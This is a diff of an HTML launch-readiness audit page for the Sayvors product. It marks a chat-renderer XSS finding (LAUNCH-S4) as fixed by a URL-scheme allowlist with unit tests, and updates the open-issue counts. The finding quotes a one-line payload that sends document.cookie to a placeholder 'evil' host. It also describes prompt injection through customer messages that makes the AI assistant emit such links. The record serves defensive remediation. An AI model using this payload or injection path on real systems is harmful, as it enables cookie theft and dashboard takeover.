@@ -186,7 +186,7 @@
 
 <div class="top">
   <span class="name">Sayvors 1M-User Readiness</span>
-  <span class="chip warn"><a href="#pass-2026-11-01">Nov 1 launch audit</a>: 27 open (1 blocker · 17 majors · 9 medium) · INS: 3 open · original audit: 2 open (OPS-1, OPS-4) · 36 resolved · handoff 16/16 fixed</span> <span class="chip warn"><a href="#pass-2026-11-02">Nov 2 facts audit</a>: 8 open (2 high · 4 medium · 2 low)</span> <span class="chip ok">deps: 55/55 closed</span> <span class="chip ok">suite: 2,052 passed / 3 skipped (post-shim, 2026-11-02)</span>
+  <span class="chip warn"><a href="#pass-2026-11-01">Nov 1 launch audit</a>: 26 open (1 blocker · 16 majors · 9 medium) · INS: 3 open · original audit: 2 open (OPS-1, OPS-4) · 36 resolved · handoff 16/16 fixed</span> <span class="chip warn"><a href="#pass-2026-11-02">Nov 2 facts audit</a>: 8 open (2 high · 4 medium · 2 low)</span> <span class="chip ok">deps: 55/55 closed</span> <span class="chip ok">suite: 2,052 passed / 3 skipped (post-shim, 2026-11-02)</span>
   <nav class="topnav">
     <a href="#blockers">Blockers</a>
     <a href="#pass-2026-10-25">Oct 25 pass</a>
@@ -224,7 +224,7 @@
   <div class="stat"><div class="n amber">Live</div><div class="l">billing &amp; plans — wallet hotfix + durable ledger + 5 plans + admin plan CRUD + tenant grant-plan + entitlements service + enforcement at channel-connect/message-send/LLM; deployed to staging 2026-10-28, schema caught up from 5 migrations behind to <code>h4b5c6d7e8f9</code> head. Plan comparison + request-upgrade UI shipped (<a href="#billing">§6b</a>)</div></div>
   <div class="stat"><div class="n calm">1,645</div><div class="l">backend tests (2 skipped in CI where pgvector runs; 4 skipped locally without Postgres) — CI gates every staging deploy on them; staging CI run #77 passed on <code>d82d800</code></div></div>
   <div class="stat"><div class="n amber">3</div><div class="l"><a href="#pass-2026-10-25">Oct 25 pass</a> — new findings still open: INS-3, INS-4, INS-5 (INS-1, INS-2, INS-6, INS-7 fixed)</div></div>
-  <div class="stat"><div class="n">27</div><div class="l"><a href="#pass-2026-11-01">Nov 1 launch audit</a> - 1 blocker · 17 majors · 9 medium batches open; three are ~1-line fixes (P4, S7, S12). Detail: docs/tracking/2026-11-01-launch-readiness-audit-phase1.md</div></div>
+  <div class="stat"><div class="n">26</div><div class="l"><a href="#pass-2026-11-01">Nov 1 launch audit</a> - 1 blocker · 16 majors · 9 medium batches open; three are ~1-line fixes (P4, S7, S12). Detail: docs/tracking/2026-11-01-launch-readiness-audit-phase1.md</div></div>
   <div class="stat"><div class="n">8</div><div class="l"><a href="#pass-2026-11-02">Nov 2 facts audit</a> — Review Intelligence + Analytics "actual facts" gaps: listing Q&amp;A, competitor deltas, grid rank, AI-answer visibility. Strategy rule: every number a tenant sees must be verifiable on Google Maps or carry a named source</div></div>
 </div>
 
@@ -396,11 +396,11 @@
       <td class="num">2–3 hrs</td>
     </tr>
     <tr>
-      <td class="num">LAUNCH-S4</td><td><span class="chip high">High</span></td>
-      <td><strong><code>javascript:</code> URLs render in the chat markdown renderer.</strong> The hand-rolled link token renders <code>href={link[2]}</code> with no protocol check; the regex matches <code>javascript:this.location='//evil/'+document.cookie</code> (no spaces needed) and React renders it as-is; <code>rel="noreferrer"</code> does not neutralize it. Source is AI assistant output, prompt-injectable through customer messages — an injected link clicked by an agent executes JS in the dashboard origin.</td>
-      <td class="path">apps/web/components/chat/SayvorsChat.tsx:127-133</td>
-      <td>Allowlist <code>http/https/mailto</code> before rendering the anchor.</td>
-      <td class="num">~30 min</td>
+      <td class="num">LAUNCH-S4</td><td><span class="chip ok">Fixed</span></td>
+      <td><strong><code>javascript:</code> URLs render in the chat markdown renderer.</strong> The hand-rolled link token rendered <code>href={link[2]}</code> with no protocol check; the regex matches <code>javascript:this.location='//evil/'+document.cookie</code> (no spaces needed) and React rendered it as-is; <code>rel="noreferrer"</code> did not neutralize it. Source is AI assistant output, prompt-injectable through customer messages — an injected link clicked by an agent executes JS in the dashboard origin. <strong>Fixed 2026-11-02:</strong> every href now passes through <code>safeHref()</code> before rendering. Only <code>http:</code>, <code>https:</code> and <code>mailto:</code> absolute schemes survive, plus relative in-app paths; <code>javascript:</code>, <code>data:</code>, <code>vbscript:</code>, <code>file:</code>, <code>blob:</code> and ASCII-control obfuscation are dropped. An unsafe link keeps its label as plain text, so the answer still reads. The anchor now uses <code>rel="noopener noreferrer"</code>. 5 unit tests pin the allowlist and the bypasses.</td>
+      <td class="path">apps/web/lib/safe-url.ts; apps/web/components/chat/SayvorsChat.tsx:127-146; apps/web/lib/safe-url.test.ts</td>
+      <td><span class="chip ok">Done</span></td>
+      <td class="num">—</td>
     </tr>
     <tr>
       <td class="num">LAUNCH-S5</td><td><span class="chip high">High</span></td>
@@ -563,7 +563,7 @@
     </tr>
   </table></div>
 
-  <p class="note">Suggested order: P4 → S2 → S7 → S4 → S12 (all ≤1 hr, highest ratio of risk removed to effort) → B3 (send-path retry/DLQ) → B5 → S1/S3/S10/S11 → the rest. Infra rows (S8/S9/S14) can land any time on the current box; they stop being optional the day a second replica or real customers arrive.</p>
+  <p class="note">Suggested order: P4 → S2 → S7 → S12 (all ≤1 hr, highest ratio of risk removed to effort) → B3 (send-path retry/DLQ) → B5 → S1/S3/S10/S11 → the rest. S4 is fixed. Infra rows (S8/S9/S14) can land any time on the current box; they stop being optional the day a second replica or real customers arrive.</p>
 </section>
 
 <section id="pass-2026-11-02">
